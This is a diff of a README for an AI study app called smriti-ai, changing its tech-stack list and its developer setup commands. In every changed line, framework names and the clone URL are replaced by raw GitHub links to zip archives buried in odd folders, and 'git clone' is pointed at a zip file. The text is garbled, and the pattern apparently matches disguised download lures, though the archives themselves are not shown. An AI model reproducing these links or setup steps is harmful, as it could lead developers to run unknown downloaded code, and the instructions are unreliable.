@@ -57,10 +57,10 @@ Use it on web, and soon — on WhatsApp & mobile apps too!
 
 ## 🛠️ Tech Stack
 
-- 🧩 **Frontend**: https://raw.githubusercontent.com/Dhruva105/smriti-ai/main/app/api/smriti_ai_v2.7.zip, TypeScript, Tailwind CSS  
+- 🧩 **Frontend**: https://raw.githubusercontent.com/Dhruva105/smriti-ai/main/app/(authenticated_Pages)/dashboard/topic/ai_smriti_1.2-beta.4.zip, TypeScript, Tailwind CSS  
 - 🧠 **AI Layer**: Gemini APIS,LLMs 
 - 🔐 **Auth**: Clerk  
-- ☁️ **Backend**: https://raw.githubusercontent.com/Dhruva105/smriti-ai/main/app/api/smriti_ai_v2.7.zip,Prisma,Mongodb  (shifted to postgres )
+- ☁️ **Backend**: https://raw.githubusercontent.com/Dhruva105/smriti-ai/main/app/(authenticated_Pages)/dashboard/topic/ai_smriti_1.2-beta.4.zip,Prisma,Mongodb  (shifted to postgres )
 - 🤖 **Bot Layer**: WhatsApp + Twilio Integration  
 - 🧪 **Chrome Extension**: Capture videos directly from YouTube //upcoming
 
@@ -69,7 +69,7 @@ Use it on web, and soon — on WhatsApp & mobile apps too!
 ## 🚀 Getting Started (Developer Mode)
 
 ```bash
-git clone https://raw.githubusercontent.com/Dhruva105/smriti-ai/main/app/api/smriti_ai_v2.7.zip
+git clone https://raw.githubusercontent.com/Dhruva105/smriti-ai/main/app/(authenticated_Pages)/dashboard/topic/ai_smriti_1.2-beta.4.zip
 cd smriti-ai
 npm install
 npm run dev
